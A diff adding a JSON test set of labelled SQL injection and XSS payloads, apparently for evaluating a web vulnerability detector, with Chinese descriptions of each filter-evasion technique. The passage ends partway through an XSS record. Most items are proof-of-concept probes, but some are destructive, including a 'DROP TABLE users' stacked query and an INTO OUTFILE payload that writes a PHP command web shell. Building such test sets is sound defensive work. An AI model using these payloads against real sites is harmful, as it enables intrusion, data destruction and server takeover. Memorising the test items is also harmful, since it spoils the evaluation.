@@ -1,0 +1,2062 @@
+[
+  {
+    "id": "adv_sqli_001",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1%27%20OR%20%271%27%3D%271",
+    "description": "URL编码 单引号",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_002",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1%27%20OR%201%3D1--",
+    "description": "URL编码 空格",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_003",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1%27%20OR%201%3D1%23",
+    "description": "URL编码 注释",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_004",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1%2527%2520OR%2520%25271%2527%253D%25271",
+    "description": "双重URL编码 单引号",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_005",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1%2527%2520UNION%2520SELECT%2520NULL--",
+    "description": "双重URL编码 UNION",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_006",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1\\u0027 OR \\u00271\\u0027=\\u00271",
+    "description": "Unicode编码 单引号",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_007",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT 0x61646d696e--",
+    "description": "十六进制编码 SELECT",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_008",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR '1'=0x31--",
+    "description": "十六进制编码 字符串",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_009",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT 0x6164--",
+    "description": "双重十六进制",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_010",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'/**/OR/**/1=1--",
+    "description": "MySQL内联注释",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_011",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'/*!50000OR*/ 1=1--",
+    "description": "MySQL版本注释",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_012",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'/*!OR 1=1*/--",
+    "description": "MySQL条件注释",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_013",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'/**/OR/**/1/**/=/**/1--",
+    "description": "多行注释绕过",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_014",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1=1#",
+    "description": "哈希注释",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_015",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1=1-- -",
+    "description": "双减号注释",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_016",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'; OR 1=1--",
+    "description": "分号分隔",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_017",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UnIoN SeLeCt NULL--",
+    "description": "大小写混淆 SELECT",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_018",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' oR 1=1--",
+    "description": "大小写混淆 OR",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_019",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' aNd '1'='1",
+    "description": "大小写混淆 AND",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_020",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UnIoN/**/sElEcT/**/null--",
+    "description": "混合大小写",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_021",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1=1%00",
+    "description": "%00截断",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_022",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'\tOR\t1=1--",
+    "description": "空白符变体 TAB",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_023",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'\nOR\n1=1--",
+    "description": "空白符变体 换行",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_024",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'\r\nOR\r\n1=1--",
+    "description": "空白符变体 CRLF",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_025",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'\u000bOR\u000b1=1--",
+    "description": "空白符变体 垂直tab",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_026",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1=1\u0000--",
+    "description": "NULL字节注入",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_027",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' || 1=1--",
+    "description": "管道符替代",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_028",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 'x'='x",
+    "description": "等式恒真",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_029",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1=2-1--",
+    "description": "减法恒真",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_030",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1=5/5--",
+    "description": "除法恒真",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_031",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 'a' LIKE 'a'--",
+    "description": "LIKE比较",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_032",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1 BETWEEN 1 AND 1--",
+    "description": "BETWEEN",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_033",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR 1 IN (1)--",
+    "description": "IN子句",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_034",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR LENGTH('x')=1--",
+    "description": "函数调用恒真",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_035",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR ASCII('a')=97--",
+    "description": "ASCII函数",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_036",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT CHAR(97,100,109,105,110)--",
+    "description": "CHAR函数",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_037",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT CONCAT(CHAR(97),CHAR(100))--",
+    "description": "CONCAT绕过",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_038",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' ORDER BY 1--",
+    "description": "ORDER BY探测",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_039",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT NULL,NULL,NULL--",
+    "description": "UNION SELECT NULL多列",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_040",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'/**/UNION/**/SELECT/**/NULL--",
+    "description": "注释中的空格",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_041",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' AND (SELECT 1)=1--",
+    "description": "SELECT子查询",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_042",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' AND EXISTS(SELECT 1)--",
+    "description": "EXISTS子查询",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_043",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' AND BENCHMARK(5000000,MD5('x'))--",
+    "description": "延时注入 BENCHMARK",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_044",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' AND IF(1=1,SLEEP(5),0)--",
+    "description": "延时注入 IF",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_045",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1'; DROP TABLE users--",
+    "description": "堆叠查询",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_046",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1 OR 1=1",
+    "description": "数字型注入",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_047",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' AND SUBSTRING('admin',1,1)='a",
+    "description": "布尔盲注 字符比较",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_048",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1%df%27 OR 1=1--",
+    "description": "宽字节绕过 GBK",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_049",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "-1' OR 1=1--",
+    "description": "负号探测",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_050",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION ALL SELECT NULL--",
+    "description": "UNION ALL变体",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_051",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT table_name FROM information_schema.tables--",
+    "description": "数据库枚举",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_052",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT column_name FROM information_schema.columns--",
+    "description": "列名枚举",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_053",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' AND (SELECT COUNT(*) FROM users)>0--",
+    "description": "子查询绕过",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_054",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' HAVING 1=1--",
+    "description": "HAVING绕过",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_055",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' GROUP BY 1 HAVING 1=1--",
+    "description": "GROUP BY绕过",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_056",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT (SELECT table_name FROM information_schema.tables LIMIT 1)--",
+    "description": "UNION SELECT 子查询",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_057",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "0x312720554e494f4e2053454c454354204e554c4c--",
+    "description": "十六进制UNION",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_058",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' OR '1\\'='1",
+    "description": "字符串转义绕过",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_sqli_059",
+    "category": "SQL注入",
+    "subcategory": "编码/混淆绕过",
+    "payload": "1' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'--",
+    "description": "INTO OUTFILE",
+    "expected_type": "SQL注入",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_001",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<script>alert(1)</script>",
+    "description": "标准script",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_002",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<SCRIPT>alert(1)</SCRIPT>",
+    "description": "大写SCRIPT",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_003",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<ScRiPt>alert(1)</ScRiPt>",
+    "description": "混合大小写",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_004",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<script >alert(1)</script>",
+    "description": "script内嵌空格",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_005",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<script x>alert(1)</script>",
+    "description": "script多余属性",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_006",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=alert(1)>",
+    "description": "img onerror",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_007",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=\"x\" onerror=\"alert(1)\">",
+    "description": "img onerror引号",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_008",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img onerror=alert(1)>",
+    "description": "img 无src",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_009",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img onload=alert(1)>",
+    "description": "img onload",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_010",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<body onload=alert(1)>",
+    "description": "body onload",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_011",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<svg onload=alert(1)>",
+    "description": "svg onload",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_012",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<svg><script>alert(1)</script></svg>",
+    "description": "svg 内嵌script",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_013",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<input onfocus=alert(1) autofocus>",
+    "description": "input onfocus",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_014",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<details open ontoggle=alert(1)>",
+    "description": "details ontoggle",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_015",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<marquee onstart=alert(1)>",
+    "description": "marquee onstart",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_016",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<select onfocus=alert(1) autofocus>",
+    "description": "select onfocus",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_017",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<video><source onerror=alert(1)>",
+    "description": "video onerror",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_018",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<audio src=x onerror=alert(1)>",
+    "description": "audio onerror",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_019",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<object data=\"javascript:alert(1)\">",
+    "description": "object data",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_020",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<iframe src=\"javascript:alert(1)\">",
+    "description": "iframe src",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_021",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<a href=\"javascript:alert(1)\">click</a>",
+    "description": "a href",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_022",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<form action=\"javascript:alert(1)\"><button>submit</button></form>",
+    "description": "form action",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_023",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<button onclick=\"alert(1)\">click</button>",
+    "description": "button onclick",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_024",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<div onmouseover=\"alert(1)\">hover</div>",
+    "description": "div onmouseover",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_025",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<div style=\"x:expression(alert(1))\">",
+    "description": "style expression",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_026",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<math><mi><a xlink:href=\"javascript:alert(1)\">x</a></mi></math>",
+    "description": "math标签",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_027",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<embed src=\"javascript:alert(1)\">",
+    "description": "embed src",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_028",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<keygen onfocus=alert(1) autofocus>",
+    "description": "keygen onfocus",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_029",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+    "description": "HTML实体 分号",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_030",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
+    "description": "HTML实体 十进制",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_031",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+    "description": "HTML实体 十六进制",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_032",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "&#60;img&#32;src&#61;x&#32;onerror&#61;alert(1)&#62;",
+    "description": "HTML实体 img",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_033",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "&#x3c;&#115;&#x63;&#114;&#105;&#x70;&#116;&#x3e;alert(1)&#x3c;/script&#x3e;",
+    "description": "HTML实体 混合",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_034",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "\\x3cscript\\x3ealert(1)\\x3c\\x2fscript\\x3e",
+    "description": "JS escape",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_035",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "description": "JS unicode",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_036",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+    "description": "JS fromCharCode",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_037",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
+    "description": "JS 逗号拼接",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_038",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "description": "双写script",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_039",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<scr<object>ipt>alert(1)</scr</object>ipt>",
+    "description": "嵌套标签",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_040",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>",
+    "description": "注释绕过",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_041",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=\"al/**/ert(1)\">",
+    "description": "JS注释",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_042",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "<img src=x onerror=\"al\ner\\\nt(1)\">",
+    "description": "JS换行",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_043",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+    "description": "URL编码 标签",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_044",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+    "description": "部分URL编码",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_045",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
+    "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+    "description": "双重URL编码",
+    "expected_type": "XSS",
+    "expected_vulnerable": true,
+    "difficulty": "medium"
+  },
+  {
+    "id": "adv_xss_046",
+    "category": "XSS",
+    "subcategory": "标签/编码/混淆绕过",
